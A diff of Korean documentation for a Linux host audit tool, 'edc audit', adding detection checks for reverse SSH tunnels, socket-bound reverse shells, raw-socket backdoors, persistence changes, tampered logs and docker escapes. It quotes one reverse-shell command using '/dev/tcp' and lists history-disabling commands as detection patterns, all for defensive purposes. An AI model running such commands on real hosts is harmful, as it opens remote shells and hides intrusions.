@@ -80,6 +80,8 @@ Linux의 `storage`는 `/proc/mdstat`과 `smartctl --json`을 읽습니다. `smar
 
 macOS에서 `time`과 `reboot`은 `skip`입니다. Linux 결과에는 `thermal`과 `backup`이 없습니다.
 
+`reboot`는 `/var/run/reboot-required`, `/var/run/reboot-required.pkgs`, `/boot`의 커널을 읽습니다. 요약에는 재부팅이 필요한 이유가 나옵니다. `/boot`에 실행 중인 것보다 새 커널이 있으면 커널 업데이트가 재부팅해야 적용된다는 뜻입니다. 그 밖의 패키지는 라이브러리나 서비스입니다. 근거에는 재부팅을 요청한 시각과 지난 일수, 설치된 커널과 실행 중인 커널의 부팅 시각, 요청한 패키지 전체가 나옵니다.
+
 `--group`은 `edc remote`의 inventory와 OpenSSH 설정을 씁니다. 각 호스트에 `check`가 있는 edc가 있어야 합니다. 표에는 호스트마다 한 줄이 나옵니다. 결과를 받지 못한 호스트는 SSH 실패나 `check`가 없는 edc처럼 그 이유를 보여 줍니다.
 
 이미 확인한 결과를 받아들이려면 `config.toml`에 `[check]` 표를 넣으세요.
@@ -159,66 +161,94 @@ webhook이 2xx로 답하지 않으면 edc는 이유를 stderr에 적고, 점검�
 
 ## 호스트 점검 (Linux)
 
-`edc audit`는 Linux 호스트의 노출 상태와 설정을 읽습니다. 파일, sysctl 값, listen 소켓, 로그인 기록, `/proc`만 읽고, 아무것도 바꾸지 않으며 외부로 보내지 않습니다. 1초 안에 끝납니다.
+`edc audit`는 Linux 호스트의 노출 상태와 설정을 읽습니다. 파일, sysctl 값, listen 소켓, 로그인 기록, `/proc`, docker socket만 읽고, 아무것도 바꾸지 않으며 외부로 보내지 않습니다. 읽는 파일이 page cache에 있으면 1초 안에 끝납니다. journal이 큰 호스트의 첫 실행은 몇 초 걸릴 수 있습니다.
 
 ```bash
 sudo edc audit
-sudo edc audit -v               # 결과마다 근거가 된 값과 규칙 추가
+sudo edc audit -v               # pass 결과의 근거도 추가
 sudo edc audit --json -         # 점검마다 결과 하나
 ```
+
+`warn`과 `fail` 결과는 요약 아래에 근거를 보여 줍니다. 점검이 찾은 로그인, process, 파일 같은 것입니다. `-v`를 주면 `pass` 결과의 근거도 보입니다. 근거에서 들여 쓰지 않은 줄은 찾은 항목이고, 들여 쓴 줄은 그 항목에서 읽은 값이며, `→`로 시작하는 줄은 edc의 설명입니다. 색을 쓰면 찾은 항목은 굵게, 설명은 회색으로 나옵니다.
 
 | 점검 | fail | warn |
 |---|---|---|
 | `net.exposed` | DB·제어 포트가 loopback 밖에 열려 있고 호스트 방화벽이 들어오는 트래픽을 허용함 | 같은 포트가 열려 있지만 방화벽이 기본으로 차단하거나, 방화벽을 읽지 못함 |
 | `net.firewall` | | input chain에 규칙이 없음 |
+| `net.ipv6_open` | | 공인 IPv6 주소가 있고, IPv6 input이 기본 허용이며, IPv6에서 듣는 포트가 있음 |
 | `net.ip_forward` | | forwarding이 켜져 있는데 컨테이너 런타임이 없음 |
+| `net.reverse_tunnel` | | sshd의 연결 process가 포트를 들음(`ssh -R`), 또는 이 호스트의 ssh client가 `-R`, `-w`, `RemoteForward`, `Tunnel`로 터널을 엶 |
 | `ssh.root_login` | | `PermitRootLogin yes` |
 | `ssh.password_auth` | 비밀번호 로그인이 켜져 있고 `PermitEmptyPasswords yes` | 비밀번호 로그인이 켜져 있음 |
+| `ssh.forwarding` | | `GatewayPorts`가 `yes`나 `clientspecified`이거나 `PermitTunnel`이 켜짐 |
 | `ssh.key_files` | 다른 사용자가 `~/.ssh`나 `AuthorizedKeysFile`의 파일에 쓸 수 있음 | |
 | `ssh.key_changed` | | `AuthorizedKeysFile` 파일의 mtime이나 ctime이 최근 7일 안임 |
+| `ssh.extra_sshd` | | `ssh.service`나 `sshd.service` 밖에서 sshd listener가 실행 중, 또는 systemd가 없는 호스트에서 sshd listener가 둘 이상 |
 | `user.uid0` | root 외에 UID 0인 계정이 있음 | |
 | `user.empty_pass` | 빈 비밀번호 계정이 있음 | |
 | `user.sudo_nopass` | | 비밀번호 없이 모든 명령을 허용하는 sudo 규칙이 있음 |
 | `user.root_groups` | | `docker`나 `lxd` 그룹에 멤버가 있음 |
 | `login.mismatch` | `lastlog`에 남은 로그인이 `wtmp`에 없거나, `wtmp`와 sshd journal에 `lastlog`보다 늦은 로그인이 있음 | `wtmp`의 원격 터미널 로그인에 sshd journal의 `Accepted`가 없거나, `wtmp`에 0으로 채운 레코드가 있거나, `wtmp`는 비어 있는데 `lastlog`에 로그인이 있음 |
+| `login.local_source` | | sshd journal의 `Accepted` 로그인 가운데 출발지가 loopback 주소이거나 이 호스트의 주소인 것이 있음 |
 | `history.tampered` | bash나 zsh의 history 파일이 `/dev/null`을 가리키거나 문자 장치이거나, 1분 넘는 세션이 끝난 뒤에 비어 있거나 없음 | 1분 넘는 마지막 세션 동안 history 파일이 바뀌지 않음 |
 | `history.disabled` | | 시작 파일이 history를 끔: `unset HISTFILE`, `HISTFILE=/dev/null`, `HISTSIZE=0`, `HISTFILESIZE=0`, `SAVEHIST=0`, `set +o history` |
 | `proc.unusual_exe` | | process가 `/tmp`, `/var/tmp`, `/dev/shm`, 메모리(`memfd`)에서 실행 중이거나, 패키지 디렉터리 밖에서 지워진 파일이나 공유 라이브러리를 씀 |
 | `proc.preload` | | `/etc/ld.so.preload`에 항목이 있거나 `LD_PRELOAD`로 실행 중인 process가 있음 |
+| `proc.socket_shell` | | process의 표준 입력이나 출력이 TCP 연결임(reverse shell) |
+| `proc.raw_socket` | | 실행 파일이 임시 디렉터리, 지워진 파일, 메모리에 있거나 어느 dpkg 패키지에도 없는 process가 packet·raw 소켓을 쥠 |
+| `persist.changed` | | cron, systemd, 시작 스크립트, `sudoers.d`, `pam.d`, `ld.so.conf.d`, udev, motd 파일이나 계정의 shell 시작 파일, `~/.ssh/rc`가 최근 7일 안에 바뀜 |
 | `file.sensitive` | 다른 사용자가 `/etc/shadow`를 읽거나 `/etc/passwd`, `/etc/sudoers`, `docker.sock`에 쓸 수 있음 | |
 | `file.path_writable` | 다른 사용자가 root `PATH`의 디렉터리에 쓸 수 있거나 `PATH`에 상대 경로가 있음 | |
+| `file.pkg_modified` | binary나 PAM 모듈의 MD5가 소속 패키지의 dpkg checksum과 다름 | |
 | `kernel.sysctl` | | 하드닝 값이 권장 값과 다름 |
-| `patch.reboot` | | 패키지가 재부팅을 요구하거나, `/boot`에 실행 중인 것보다 새 커널이 있음 |
+| `kernel.taint` | | `/proc/sys/kernel/tainted`에 강제 적재(F), 커널 트리 밖(O), 서명 없음(E) 모듈이 표시됨 |
+| `docker.escape` | | 실행 중인 docker 컨테이너가 privileged이거나, 호스트 PID namespace를 쓰거나, `SYS_ADMIN` 같은 capability를 더하거나, `docker.sock`이나 호스트 `/`를 쓰기 가능하게 mount함 |
 | `ctr.privileged` | edc가 모든 capability를 가져 컨테이너가 privileged임 | |
 | `ctr.docker_sock` | 컨테이너 안의 `/var/run/docker.sock`이나 `/run/docker.sock`이 socket임 | |
 | `ctr.root_user` | | edc가 컨테이너 안에서 UID 0으로 실행됨 |
 | `ctr.host_ns` | 컨테이너가 호스트의 PID namespace를 씀 | |
 
-DB·제어 포트는 2375, 2379, 3306, 5432, 6379, 9200, 10250, 11211, 27017입니다.
+DB·파일 공유·원격 데스크톱·제어 포트는 111, 139, 445, 2049, 2181, 2375, 2376, 2379, 3306, 3389, 4369, 5432, 5672, 5900, 5984, 6379, 8086, 8500, 9042, 9092, 9200, 10250, 11211, 15672, 27017입니다. 호스트 방화벽이 들어오는 트래픽을 막을 때는, docker가 모든 주소에 publish한 그 밖의 포트를 경고로 알립니다. 이 포트는 FORWARD chain을 지나므로 INPUT 차단이 적용되지 않습니다.
 
 `ctr.*` 점검은 컨테이너 안에서만 실행됩니다. 컨테이너인지는 `edc info`와 같은 표식(`KUBERNETES_SERVICE_HOST`, `/.dockerenv`, `/run/.containerenv`)으로 판단하고, 호스트에서는 보고서에 나오지 않습니다. 컨테이너가 호스트의 PID namespace를 쓰면 `ctr.host_ns`는 network namespace도 PID 1의 것과 비교합니다.
 
 로그인과 history 점검은 침입자가 고칠 수 있는 기록끼리 비교합니다. `fail`은 두 기록이 어긋난다는 뜻이며 침입의 증거는 아닙니다. `wtmp`가 시작하기 전의 로그인은 비교할 수 없으므로 결과마다 `wtmp`의 시작 시각을 적습니다.
 
-`login.mismatch`는 `/var/log/wtmp`, 압축되지 않은 `/var/log/wtmp.1`, `/var/log/lastlog`를 읽습니다. `lastlog`에 남은 계정별 마지막 로그인을 `wtmp`의 로그인과 비교하며, 사용자와 터미널이 같고 시각이 1초 안에 맞아야 합니다. `wtmp` 파일마다 마지막 64 MiB만 읽습니다. `wtmpdb`나 `lastlog2`의 SQLite 기록은 읽지 않으며, 그 기록만 있으면 로그인 점검은 `skip`입니다.
+`login.mismatch`는 `/var/log/wtmp`, 압축되지 않은 `/var/log/wtmp.1`, `/var/log/lastlog`를 읽습니다. `lastlog`에 남은 계정별 마지막 로그인을 `wtmp`의 로그인과 비교하며, 사용자와 터미널이 같고 시각이 1초 안에 맞아야 합니다. `wtmp` 파일마다 마지막 64 MiB만 읽습니다. `wtmpdb`나 `lastlog2`의 SQLite 기록은 읽지 않으며, 그 기록만 있으면 `login.mismatch`는 `skip`입니다.
 
 root로 실행하면 최근 7일의 `systemd-logind`, `sshd`, `sshd-session` journal도 읽고, sshd process의 PID로 세 원천을 짝짓습니다. sshd는 터미널이 있는 세션만 `wtmp`에 남기므로 `scp`, `sftp`, `ssh host 명령`은 journal에만 보입니다. `-v`로 실행하면 `login.mismatch`가 이 접속을 사용자, 출발지, 방식별로 보여 줍니다. 이 접속은 판정을 바꾸지 않습니다.
 
-journal로 `wtmp`와 `lastlog`를 반대 방향으로도 비교합니다. sshd는 터미널 로그인마다 `lastlog`를 고치므로, `wtmp`와 journal에 더 늦은 로그인이 있으면 `lastlog`를 되돌린 것입니다. `wtmp`의 원격 터미널 로그인에 `Accepted`가 없으면 warn입니다. journald는 rate limit에 걸리면 항목을 버리므로 fail로 보지 않습니다. OpenSSH 9.8부터는 `wtmp`, `Accepted`, logind에 같은 PID가 남습니다. 연결 하나가 `ControlMaster`처럼 터미널을 여러 번 열 수 있으므로, `wtmp` 로그인은 PID, 사용자, 주소가 같은 `Accepted`의 연결이 끝나기 전에 시작했으면 그 `Accepted`와 짝짓습니다. `wtmp`에 주소 대신 호스트 이름이 남으면(`UseDNS yes`) 주소는 비교하지 않습니다. 연결은 같은 PID의 `session closed` 기록이나 그 PID의 다음 `Accepted`에서 끝납니다. 그 뒤의 로그인은 재사용된 PID라 짝짓지 않습니다. 7일보다 먼저 시작한 연결은 그 PID의 다른 journal 기록과 `session closed` 기록의 사용자로 확인합니다. 9.8 미만은 `wtmp`에 shell의 PID를 남깁니다. PID가 맞지 않는 로그인은 사용자와 출발지가 같고 2초 안에 남은 `Accepted`로 짝짓고, 그렇게 짝지은 로그인 수를 경고로 알립니다. 후보가 둘 이상이면 journal에서 세션의 끝을 가져오지 않습니다. 하나도 짝짓지 못하면 두 원천을 짝짓지 않습니다. journal에 `Accepted`가 하나도 없으면 journal의 첫 기록 뒤의 로그인을 비교합니다.
+journal로 `wtmp`와 `lastlog`를 반대 방향으로도 비교합니다. sshd는 터미널 로그인마다 `lastlog`를 고치므로, `wtmp`와 journal에 더 늦은 로그인이 있으면 `lastlog`를 되돌린 것입니다. `wtmp`의 원격 터미널 로그인에 `Accepted`가 없으면 warn입니다. journald는 rate limit에 걸리면 항목을 버리므로 fail로 보지 않습니다. OpenSSH 9.8부터는 `wtmp`, `Accepted`, logind에 같은 PID가 남습니다. 연결 하나가 `ControlMaster`처럼 터미널을 여러 번 열 수 있으므로, `wtmp` 로그인은 PID, 사용자, 주소가 같은 `Accepted`의 연결이 끝나기 전에 시작했으면 그 `Accepted`와 짝짓습니다. `wtmp`에 주소 대신 호스트 이름이 남으면(`UseDNS yes`) 주소는 비교하지 않습니다. 연결은 같은 PID의 `session closed` 기록이나 그 PID의 다음 `Accepted`에서 끝납니다. 그 뒤의 로그인은 재사용된 PID라 짝짓지 않습니다. 7일보다 먼저 시작한 연결은 그 PID의 다른 journal 기록과 `session closed` 기록의 사용자로 확인합니다. 9.8 미만은 `wtmp`에 shell의 PID를 남깁니다. PID가 맞지 않는 로그인은 사용자와 출발지가 같고 2초 안에 남은 `Accepted`로 짝짓고, 그렇게 짝지은 로그인 수를 경고로 알립니다. 후보가 둘 이상이면 journal에서 세션의 끝을 가져오지 않습니다. 하나도 짝짓지 못하면 두 원천을 짝짓지 않습니다. 9.8 미만에서 연결 하나에 터미널을 더 열면(`ControlMaster`) 새 `Accepted`가 남지 않습니다. 그런 로그인이 아직 열려 있으면 shell의 부모를 따라 그 연결의 sshd process를 찾아 그 `Accepted`와 짝짓습니다. 이미 끝난 로그인은 shell의 PID가 다시 쓰였을 수 있어 부모를 따라가지 않습니다. PID로 짝지은 로그인이 하나도 없으면, 그 로그인이 시작할 때 열려 있던 같은 사용자·출발지의 연결과 짝짓고 그 수를 경고로 알립니다. journal에 `Accepted`가 하나도 없으면 journal의 첫 기록 뒤의 로그인을 비교합니다.
+
+`login.local_source`는 `login.mismatch`와 같은 범위의 `sshd`, `sshd-session` journal에서 `Accepted` 기록을 읽습니다. root가 필요하지만 `wtmp`는 필요하지 않습니다. journal을 읽지 못하면 `pass`가 아니라 `skip`입니다.
+
+출발지가 loopback 주소이거나 이 호스트 인터페이스의 주소인 로그인이 범위 안에 하나라도 있으면 warn입니다. 터널, 중계 도구, 로컬 `ssh` 명령이 모두 이런 로그인을 만듭니다. sshd에는 이 호스트의 process가 클라이언트로 보이기 때문입니다.
+
+연결이 아직 열려 있으면 근거에 그 연결이 먼저 나옵니다. 그 줄에는 연결의 반대편 소켓을 쥔 상대 process의 PID, 이름, 실행 파일, 명령 인자가 3개까지 붙습니다. 명령 인자의 비밀 값은 가립니다. 상대 process를 찾지 못한 연결은 찾지 못했다고 표시합니다. `ssh -L`, `-D`, `-J`로 들어온 로그인은 터널을 나르는 `sshd-session`이 상대 process입니다. 이때는 그 터널을 연 ssh 로그인의 사용자, 출발지 주소와 포트, 방식, 시각도 적습니다. 그 로그인이 journal 범위보다 먼저면 출발지 주소와 포트만 적습니다. `Accepted`를 남긴 sshd process가 서버 쪽 소켓을 아직 쥐고 있을 때만 열린 연결로 봅니다. 나머지는 끝난 로그인이며 사용자, 출발지, 방식별로 묶어 횟수와 마지막 시각을 적습니다. 근거는 10줄까지 적습니다. 이미 아는 터널은 `accept`에 `login.local_source`를 넣어 받아들일 수 있습니다.
+
+한계는 다음과 같습니다. 이 호스트의 주소는 실행 시점의 인터페이스 주소입니다. 최근 7일 사이에 주소가 바뀌었으면 예전 주소로 온 로그인을 놓칠 수 있습니다. 중계가 다른 호스트에서 끝나면 sshd에는 그 호스트의 주소가 보입니다. 컨테이너의 주소는 이 호스트의 주소로 보지 않습니다. sshd를 거치지 않은 접근과 지워진 journal은 보이지 않습니다. 출발지가 주소가 아니라 이름이면 판정하지 않고 건수를 경고로 알립니다. 인터페이스 주소를 읽지 못하면 loopback만 비교하고, TCP 표를 읽지 못하면 상대 process를 찾지 않으며, 두 경우 모두 경고로 알립니다. 상대 process 찾기는 OpenSSH 10.0의 동작에 기대므로, 다른 버전에서는 열린 연결이 끝난 로그인으로 보일 수 있습니다.
 
 `history.tampered`는 UID 0이나 1000 이상이고 bash나 zsh를 쓰는 계정을 봅니다. history 파일을 `wtmp`의 `pts/*` 세션과 비교합니다. shell은 끝날 때 history를 쓰므로 세션이 시작된 뒤에 파일이 바뀌어야 합니다. `wtmp`에 로그아웃 기록을 남기지 않는 시스템에서는 세션의 끝을 `systemd-logind` journal에서 찾습니다. 두 원천 모두 세션의 끝이 없으면 `/dev/null` 연결만 확인하고, 시각을 비교하지 못한 계정 수를 경고로 알립니다. 시작 파일이 `HISTFILE`을 다른 경로로 바꾼 계정과 `HISTFILE`이 없는 zsh 계정은 판정하지 않고 계정마다 경고로 알립니다. 시작 파일에 `HISTSIZE=0`, `HISTFILESIZE=0`, `SAVEHIST=0`, `set +o history`가 있는 계정도 history가 비는 것이 정상이라 판정하지 않습니다. 없는 파일을 가리키는 symlink와 디렉터리는 history 파일이 없는 것으로 봅니다. 시작 파일에서는 history 설정만 읽고 shell을 실행하지 않습니다. 나중에 읽는 시작 파일이 설정을 다시 바꾸면 그 값을 따릅니다. `history.disabled`의 근거에는 파일, 줄 번호, 찾은 설정만 나오고 줄 전체는 나오지 않습니다.
 
 SSH 키 점검은 `AuthorizedKeysFile`의 파일을 읽습니다. 기본값은 `.ssh/authorized_keys .ssh/authorized_keys2`입니다. `AuthorizedKeysCommand`가 키를 주면 edc가 확인할 수 없으므로 경고로 알립니다. `ssh.key_changed`는 파일마다 mtime과 ctime 가운데 늦은 쪽을 봅니다. `touch`는 mtime을 되돌릴 수 있지만 ctime은 되돌리지 못합니다. 관리자도 로그인한 뒤 키를 넣으므로 warn만 냅니다. 근거에는 바뀌기 바로 전의 `wtmp` 로그인이 나옵니다.
 
-`proc.unusual_exe`는 `/proc/<pid>/exe`를 읽습니다. 패키지를 업그레이드하면 실행 중인 daemon의 binary가 지워진 채 남으므로 `/usr`, `/bin`, `/sbin`, `/lib`, `/lib64` 아래에서 지워진 binary는 판정하지 않습니다. `runc`가 자기를 메모리에 복제해 실행하는 것도 판정하지 않습니다. 같은 규칙으로 `/proc/<pid>/maps`에서 지워진 공유 라이브러리를 찾습니다. `proc.preload`는 `/etc/ld.so.preload`와 `/proc/<pid>/environ`의 `LD_PRELOAD`를 읽습니다. 다른 사용자 process의 환경은 root만 읽을 수 있습니다.
+백도어 점검은 `/proc`를 한 번 훑습니다. `net.reverse_tunnel`은 포트를 듣는 sshd 연결 process를 찾습니다. `ssh -R` client가 연 포트이며, 이 포트로 들어온 연결은 그 ssh 연결을 타고 나갑니다. `ssh -X`가 X11에 쓰는 loopback 6010~6099 포트는 판정하지 않습니다. 이 호스트의 `ssh` client 인자도 읽습니다. `-R`, `-w`, `RemoteForward`, `Tunnel`은 원격 호스트에서 이 호스트로 들어오는 길을 엽니다. `-L`과 `-D`는 흔해서 판정하지 않습니다. `~/.ssh/config`의 `RemoteForward`는 인자에 없어 보이지 않습니다.
+
+`ssh.extra_sshd`는 sshd listener마다 cgroup을 읽습니다. ssh 서비스 밖의 sshd는 자기 설정과 로그 파일을 쓸 수 있어, 그 로그인이 journal에 남지 않을 수 있습니다. 컨테이너 안의 sshd는 판정하지 않습니다. `proc.socket_shell`은 process의 표준 입력이나 출력이 TCP 연결이면 warn입니다. `bash -i >& /dev/tcp/<host>/<port>`가 이 모양을 만듭니다. 표준 오류만 소켓으로 쓰는 daemon은 판정하지 않습니다. `proc.raw_socket`은 `/proc/net/packet`, `/proc/net/raw`, `/proc/net/raw6`를 읽습니다. 수동형 백도어는 listen 포트 없이 이런 소켓에서 특정 packet을 기다립니다. `systemd-networkd`처럼 dpkg 패키지에 속한 process는 판정하지 않습니다.
+
+`kernel.taint`는 `/proc/sys/kernel/tainted`와 `/sys/module/*/taint`를 읽습니다. 근거에는 taint가 있는 모듈과 `/lib/modules` 아래의 파일이 나옵니다. 그 아래에 파일이 없는 모듈은 다른 경로에서 넣은 것입니다. GPU 드라이버 같은 DKMS 모듈도 taint를 남기므로 warn만 냅니다. 상용(P)과 livepatch(K) 표시는 판정하지 않습니다. 커널은 재부팅 전까지 taint를 남깁니다. `file.pkg_modified`는 `openssh-server`, `sudo`, `procps`, `coreutils`, `libpam-modules` 등 패키지 18개의 binary와 PAM 모듈의 MD5를 `/var/lib/dpkg/info/*.md5sums`와 비교합니다. `dpkg-divert`로 옮긴 경로는 건너뜁니다. dpkg가 없는 호스트는 `skip`입니다.
+
+`persist.changed`는 로그인, 부팅, 정해진 시각에 명령을 실행하는 파일을 읽습니다. 파일마다 mtime과 ctime 가운데 늦은 쪽을 봅니다. `systemctl enable`이 만든 symlink도 파일로 셉니다. 바뀐 때로부터 1시간 안에 dpkg가 그 파일의 패키지 목록을 고쳤다면 패키지 업그레이드가 바꾼 것이라 판정하지 않고, 그 수를 경고로 알립니다. 근거에는 바뀌기 바로 전의 `wtmp` 로그인이 나옵니다. `docker.escape`는 docker socket으로 실행 중인 컨테이너를 읽습니다. 호스트 `/`를 읽기 전용으로 mount하거나 host network를 쓰는 것은 모니터링 컨테이너에서 흔해 판정하지 않습니다. docker 없이 containerd나 Kubernetes로 띄운 컨테이너는 읽지 않습니다.
+
+`proc.unusual_exe`는 `/proc/<pid>/exe`를 읽습니다. 패키지를 업그레이드하면 실행 중인 daemon의 binary가 지워진 채 남으므로 `/usr`, `/bin`, `/sbin`, `/lib`, `/lib64` 아래에서 지워진 binary는 판정하지 않습니다. `runc`가 자기를 메모리에 복제해 실행하는 것도 판정하지 않습니다. 근거에는 시작 시각, 부모 process, 지워진 파일의 지금 상태가 나옵니다. 같은 경로에 새 파일이 있으면 그 process는 재시작하기 전까지 옛 binary로 돌고 있는 것이고, 경로에 파일이 없으면 파일을 지운 것입니다. 같은 규칙으로 `/proc/<pid>/maps`에서 지워진 공유 라이브러리를 찾습니다. `proc.preload`는 `/etc/ld.so.preload`와 `/proc/<pid>/environ`의 `LD_PRELOAD`를 읽습니다. 다른 사용자 process의 환경은 root만 읽을 수 있습니다. 호스트에 dpkg 기록이 있으면 근거에 미리 넣은 라이브러리마다 소속 패키지가 나옵니다. 어느 패키지에도 속하지 않은 라이브러리는 누가 직접 넣은 것입니다. 경로의 `/lib`와 `/usr/lib` 형태와 symlink의 대상까지 확인합니다.
 
 계정 점검은 `/etc/passwd`를 읽습니다. `nsswitch.conf`가 `sss`, `ldap`, `winbind`, `nis`, `nisplus`, `hesiod`에서도 계정을 가져오면, 그 계정은 확인하지 않았다고 경고로 알립니다.
 
 root로 실행하세요. root가 아니면 방화벽, `/etc/shadow`, `/etc/sudoers`, 다른 사용자의 홈 디렉터리를 읽지 못합니다. 이 점검은 `pass`가 아니라 `skip`으로 나옵니다.
 
-방화벽 점검은 `nft list ruleset`을 읽고, nft에 input chain이 없으면 `iptables-save`를 읽습니다. input 규칙의 수는 세지만 규칙 순서는 해석하지 않습니다. 이 호스트만 보므로 클라우드 보안 그룹이 포트를 막고 있을 수 있습니다. `fail`은 호스트 자체가 그 포트를 막지 않는다는 뜻입니다.
+방화벽 점검은 `nft list ruleset`을 읽고, nft에 input chain이 없으면 `iptables-save`를 읽습니다. input 규칙의 수는 세지만 규칙 순서는 해석하지 않습니다. 이 호스트만 보므로 클라우드 보안 그룹이 포트를 막고 있을 수 있습니다. `fail`은 호스트 자체가 그 포트를 막지 않는다는 뜻입니다. `net.ipv6_open`은 IPv6 input을 따로 읽습니다. nft의 `ip6`·`inet` 표나 `ip6tables-save`입니다. IPv4만 막고 IPv6는 허용하는 호스트가 많습니다. 공인 IPv6 주소가 있을 때만 warn입니다. Tailscale의 `fd7a::/48` 같은 ULA 주소와 link-local 주소는 공인 주소로 보지 않습니다.
 
-SSH 점검은 `sshd_config`와 `Include`한 파일을 읽고, sshd처럼 처음 나온 값을 씁니다. `Match` 블록은 일부 연결에만 적용되므로 해석하지 않습니다. 실제 적용 값은 `sshd -T`로 확인하세요.
+SSH 점검은 `sshd_config`와 `Include`한 파일을 읽고, sshd처럼 처음 나온 값을 씁니다. 근거에는 설정마다 파일과 줄 번호가 나옵니다. 처음 값에 밀려 무시되는 뒤의 줄도 함께 나옵니다. 그 줄을 고쳐도 적용되지 않기 때문입니다. 적용되는 값이 위험하면 그 줄에 권장 값과 이유가 붙습니다. `ssh.forwarding`은 `GatewayPorts`가 `yes`나 `clientspecified`이면 warn입니다. 그러면 `ssh -R`로 연 포트가 모든 인터페이스에서 들리기 때문입니다. `PermitTunnel`이 켜져 있어도 warn입니다. `ssh -w`가 두 호스트 사이에 네트워크 장치를 만들 수 있기 때문입니다. `AllowTcpForwarding yes`는 기본값이라 값만 보여 줍니다. `Match` 블록은 일부 연결에만 적용되므로 해석하지 않습니다. 실제 적용 값은 `sshd -T`로 확인하세요.
 
 이미 확인한 결과를 받아들이려면 `config.toml`에 `[audit]` 표를 넣으세요.
 
@@ -228,7 +258,7 @@ accept = ["net.ip_forward", "user.root_groups"]
 allow_ports = [5432]
 ```
 
-`accept`에는 위 표의 점검 이름을 씁니다. `allow_ports`에 넣은 포트는 `net.exposed`가 판정하지 않고 경고로 알립니다. 없는 점검 이름이나 1~65535 밖의 포트가 있으면 설정이 잘못된 것으로 처리됩니다.
+`accept`에는 위 표의 점검 이름을 씁니다. `patch.reboot`는 `edc check`의 `reboot` 점검으로 옮겼습니다. `accept`에 남아 있어도 설정은 유효하며, `edc audit`이 안내를 출력합니다. `allow_ports`에 넣은 포트는 `net.exposed`가 판정하지 않고 경고로 알립니다. 없는 점검 이름이나 1~65535 밖의 포트가 있으면 설정이 잘못된 것으로 처리됩니다.
 
 받아들인 결과는 보고서에서 사라지지 않습니다. `skip`으로 나오고 요약 앞에 `받아들임 (fail)` 같은 표시가 붙습니다. 표시는 언어 설정을 따릅니다. JSON에서는 `metrics.accepted`가 `true`이고 `metrics.accepted_status`에 원래 상태가 남습니다. 받아들인 결과는 종료 코드를 바꾸지 않습니다.
 
